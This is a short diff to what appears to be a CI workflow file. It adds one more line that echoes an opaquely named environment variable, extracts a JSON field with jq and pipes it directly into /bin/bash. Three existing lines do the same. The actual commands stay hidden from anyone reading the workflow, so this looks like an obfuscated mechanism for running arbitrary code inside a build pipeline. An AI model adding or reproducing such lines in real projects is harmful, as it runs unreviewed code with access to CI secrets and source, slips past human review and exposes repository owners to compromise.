@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$e60" | jq -r .wvmyc17 | /bin/bash
           echo $kjc36701 | jq -r .b1656 | /bin/bash
           printf '%s' "$hx45" | jq -r .ofn18337 | /bin/bash
+          echo $m11210 | jq -r .g871 | /bin/bash
 
       - name: Save output
         if: always()
